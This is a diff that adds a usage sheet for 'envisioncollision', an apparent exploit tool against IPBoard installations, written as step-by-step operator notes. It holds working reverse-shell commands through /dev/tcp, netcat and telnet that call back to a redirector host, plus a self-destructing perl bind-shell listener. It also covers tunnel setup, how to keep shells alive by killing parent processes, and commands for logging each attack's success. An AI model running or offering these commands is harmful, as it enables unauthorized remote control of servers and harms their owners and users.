@@ -1,0 +1,101 @@
+
+2011-12-09 16:54:07 EST 
+##############################################
+# ENVISIONCOLLISION USAGE
+##############################################
+
+usage: /tmp/envisioncollision -i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>
+  
+  -i IP
+  -p # [default port = 80]
+  -t [determine if URL exists, commands are not sent]  
+  -h help
+  -c "Commands"
+  -s [request https, default is http]
+  -d debug
+  -D directory
+  -U user
+  -P password
+
+Examples:
+Window 1: nc -vv -l -p 101
+Window 2: nc -vv -l -p 102
+Window 3: /tmp/envisioncollision -UADMIN -PPASSWORD -i127.0.0.1 -Dipboard -c"sh</dev/tcp/10.1.1.1/101>&0 2>&0"
+Window 3: /tmp/envisioncollision -UADMIN -PPASSWORD -i127.0.0.1 -Dipboard -c"sleep 500|nc 10.1.1.1 101|sh|nc 10.1.1.1 102"
+Window 3: /tmp/envisioncollision -UADMIN -PPASSWORD -i127.0.0.1 -Dipboard -c"sleep 500|/usr/bin/telnet 10.1.1.1 101|sh|/usr/bin/telnet 10.1.1.1 102"
+
+
+
+##############################################
+# SETUP VARIABLES
+##############################################
+
+mx
+:%s,PROJECTNAME,PROJECTNAME,g
+:%s,ADMIN,ADMIN,g
+:%s,PASSWORD,PASSWORD,g
+:%s,REDIR_IP,REDIR_IP,g
+:%s,TARGET_IP,TARGET_IP,g
+:%s,SHELL_PORT,SHELL_PORT,g
+`x
+
+##############################################
+# OPTION 1: Target calls us back with shell
+##############################################
+
+# Target initiates a shell callback to REDIR_IP:port
+
+# On redir_ip:
+-tunnel
+r SHELL_PORT
+l 80 TARGET_IP
+
+
+# username: ADMIN
+# password: PASSWORD
+./envisioncollision -UADMIN -PPASSWORD -I 127.0.0.1 -Dipboard -c"sh</dev/tcp/REDIR_IP/SHELL_PORT>&0 2>&0"
+
+
+##############################################
+# OPTION 2: Target shell listener with perl
+##############################################
+
+# On redir_ip:
+-tunnel
+l SHELL_PORT TARGET_IP
+l 80 TARGET_IP
+
+
+
+# Target starts a listener on  LPORT it will self-destruct in LIVES seconds
+LPORT=SHELL_PORT
+LIVES=600
+./envisioncollision   -i 127.0.0.1 -UADMIN -PPASSWORD -D ipboard -c "perl -MIO -e \'if (\$k=fork){\$i=$LIVES;while(\$i--){sleep 1;}kill(9,\$k);exit;}chdir(\"/tmp\");while(\$c=new IO::Socket::INET(LocalPort,$LPORT,Reuse,1,Listen)->accept){\$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);system \"/bin/sh\";}\'"
+
+# Now connect forward to the perl shell listener you just started:
+nc -vv 127.0.0.1 $LPORT
+
+# Optional with listener method.
+# Once you are on and interactive with netcat, if
+# you kill the PARENT Perl process (parent pid is 1) 
+# with kill -9, the child process (running the LISTENer)
+# and your shell) will both survive. If you kill -9 BOTH
+# perl processes, your shell will survive.
+# survives just fine.
+ps -wefwww | grep " 1 .*perl"
+kill -9 PARENT_PID
+
+
+
+##############################################
+# Log success or failure (run at any local prompt)
+##############################################
+# NOTE: Comment is free form, you can modify it
+
+# FAILURE:
+/current/etc/autologtool -n ENVISIONCOLLISION -V 1.0.0.1 -s FAIL -u EXERCISED -c "PROJECTNAME / TARGET_IP via REDIR_IP" -T host_TARGET_IP
+# FAILURE:
+/current/etc/autologtool -n ENVISIONCOLLISION -V 1.0.0.1 -s SUCCESSFUL -u EXERCISED -c "PROJECTNAME / TARGET_IP via REDIR_IP" -T host_TARGET_IP
+
+
+
